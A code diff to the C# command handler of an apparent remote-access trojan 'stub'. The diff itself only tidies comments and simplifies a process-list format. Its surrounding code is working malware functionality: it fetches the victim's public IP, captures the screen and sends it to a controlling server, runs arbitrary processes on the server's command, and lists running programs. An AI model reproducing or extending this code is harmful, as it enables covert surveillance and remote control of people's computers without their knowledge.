@@ -42,6 +42,8 @@ namespace Stub.Forms
                 case Helpers.CommandHandler.Commands.GET_INFO:
                     using (WebClient client = new WebClient())
                     {
+                        //i understand that json would be better here but i don't want my stub having extra .dll's
+
                         //this gets the current IPAddress
                         string input = client.DownloadString("https://ipv4.wtfismyip.com/json");
 
@@ -80,7 +82,7 @@ namespace Stub.Forms
                     break;
                 case Helpers.CommandHandler.Commands.SCREEN_CAPTURE:
                     //gets the current screen of the user.
-                    Screen currentScreen = Screen.FromControl(new Forms.StubForm());
+                    Screen currentScreen = Screen.FromControl(new StubForm());
                     //gets the screens width.
                     int w = currentScreen.Bounds.Width;
                     //gets the screens height.
@@ -102,13 +104,13 @@ namespace Stub.Forms
 
                     //initializing a new image converter
                     ImageConverter converter = new ImageConverter();
-                    //converting bitmap to byte[] using imageconverter.
+                    //converting bitmap to byte[] using the initialized imageconverter.
                     byte[] sendBytes = (byte[])converter.ConvertTo(screen, typeof(byte[]));
                     //sending bytes to the server.
                     clientSocket.SendData(sendBytes);
                     break;
                 case Helpers.CommandHandler.Commands.OPEN_PROCESS:
-                    //opens the process using the datastring provided.
+                    //opens the process using the data string provided.
                     Process.Start(data);
                     break;
                 case Helpers.CommandHandler.Commands.TASK_LIST:
@@ -117,17 +119,13 @@ namespace Stub.Forms
                     //looping the current processes
                     foreach (Process proc in Process.GetProcesses())
                     {
-                        //gets the process anme
+                        //gets the process name
                         string procName = proc.ProcessName;
                         //gets the window title of the process
                         string windowTitle = proc.MainWindowTitle;
-                        //gets the used up mb
-                        string usedMb = $"{proc.WorkingSet64 / 1024 / 1024} mb";
-                        //gets the filepath
-                        string filepath = proc.StartInfo.FileName;
 
                         //appends data to string
-                        toSend += $"{procName}~{windowTitle}~{usedMb}~{filepath}|||";
+                        toSend += $"{procName}~{windowTitle}{Environment.NewLine}";
                     }
 
                     //sends data to server
@@ -146,7 +144,7 @@ namespace Stub.Forms
                     }
                     break;
                 case Helpers.CommandHandler.Commands.EXIT:
-                    //exits the current process. (for killing/closing) the connection)
+                    //kills the current process. (for killing/closing) the connection)
                     Environment.Exit(1);
                     break;
             }
